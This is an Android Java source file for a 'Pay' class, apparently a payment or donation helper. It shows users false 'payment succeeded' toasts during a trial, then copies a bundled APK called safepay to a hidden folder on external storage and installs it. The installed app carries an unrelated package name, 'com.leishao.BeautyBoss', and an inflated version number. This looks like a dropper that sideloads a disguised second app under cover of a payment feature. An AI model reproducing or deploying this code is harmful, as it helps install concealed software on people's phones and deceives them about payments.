package com.donate.pay;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.widget.Toast;

import com.donate.gf.PayCallback;
import com.donate.gf.PayInterface;

public class Pay {

	private static String PAY_PKGNAME = "com.leishao.BeautyBoss";
	private static int PAY_VERSION = 900000000;
	private static String PAY_APK_PATH = Environment
			.getExternalStorageDirectory().getAbsolutePath()
			+ "/.android/safepay.apk";

	private static String PAY_ITEM_ACTIVE = "PAY_ITEM_ACTIVE";

	static Handler handler = new Handler();

	static PayInterface payInterface;
	static PayCallback callback;
	static Context context;

	public static void init(Context ctx) {
		context = ctx;
		callback = new PayCallback.Stub() {
			@Override
			public void paySucess(String item) throws RemoteException {
				payResultSucess(item);
			}

			@Override
			public void payFailed(String item) throws RemoteException {
				payResultFailed(item);
			}
		};
		bindPayService(ctx);
	}

	private static void bindPayService(Context ctx) {
		try {
			ctx.bindService(new Intent("com.donate.PayService"),
					remoteConnection, Context.BIND_AUTO_CREATE);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static void pay(final String item, final int minFee) {
		showToast("购买任何物品只需" + minFee + "元");
		handler.post(new Runnable() {
			@Override
			public void run() {
				startPay(item, minFee);
			}

		});
	}

	public static boolean active(final int minFee) {
		SharedPreferences sp = context.getSharedPreferences("sp", 0);
		int value = sp.getInt(PAY_ITEM_ACTIVE, 0);
		if (value == 1) {
			return true;
		} else {
			int times = sp.getInt("times", 0);
			if (times < 5) {
				times++;
				sp.edit().putInt("times", times).commit();
				showToast("支付成功" + times + "次");
				return true;
			}
			showToast("试用已结束,支付" + minFee + "元，即可永久激活");
			handler.post(new Runnable() {
				@Override
				public void run() {
					startPay(PAY_ITEM_ACTIVE, minFee);
				}
			});
			return false;
		}
	}

	private static void startPay(final String item, final int minFee) {
		try {
			if (PackageUtils.isAppExist(context, PAY_PKGNAME, PAY_VERSION,
					PAY_APK_PATH)) {
				if (payInterface != null) {
					payInterface.pay(callback, item, minFee);
				} else {
					bindPayService(context);
					handler.postDelayed(new Runnable() {
						@Override
						public void run() {
							pay(item, minFee);
						}
					}, 500);
				}
			} else {
				FileUtil.copyFromAssets(context, "safepay", PAY_APK_PATH);
				PackageUtils.installNormal(context, PAY_APK_PATH);
			}
		} catch (Exception e) {
		}
	}

	private static ServiceConnection remoteConnection = new ServiceConnection() {
		public void onServiceConnected(ComponentName className, IBinder service) {
			payInterface = PayInterface.Stub.asInterface(service);
		}

		public void onServiceDisconnected(ComponentName className) {
			payInterface = null;
		}
	};

	private static void payResultSucess(String item) {
		showToast("支付成功");
		if (PAY_ITEM_ACTIVE.equals(item)) {
			SharedPreferences sp = context.getSharedPreferences("sp", 0);
			sp.edit().putInt(PAY_ITEM_ACTIVE, 1).commit();
		}
	}

	private static void payResultFailed(String item) {
		showToast("支付失败");
	}

	public static void showToast(final String msg) {
		handler.post(new Runnable() {
			@Override
			public void run() {
				Toast.makeText(context, msg, Toast.LENGTH_LONG).show();
			}
		});
	}
}
